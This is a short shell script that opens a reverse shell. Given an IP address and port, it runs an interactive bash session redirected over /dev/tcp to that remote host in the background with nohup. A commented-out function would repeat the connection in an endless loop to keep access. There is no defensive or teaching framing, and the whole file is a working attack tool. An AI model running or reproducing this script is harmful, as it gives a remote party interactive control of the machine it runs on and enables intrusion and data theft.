#!/bin/sh

#function reverse () {
#	while [ 1 ]
#	do
#    	nohup bash -i >& /dev/tcp/"$1"/"$2" 0>&1 &
#	done		
#}

if [ $# -gt 1 ]; then
	echo "\n [*] Connecting to $1 on port $2..."
	nohup bash -i >& /dev/tcp/"$1"/"$2" 0>&1 &
	echo " [*] Connected..."

else
	echo "\n Usage: $0 <IP> <PORT>"
fi

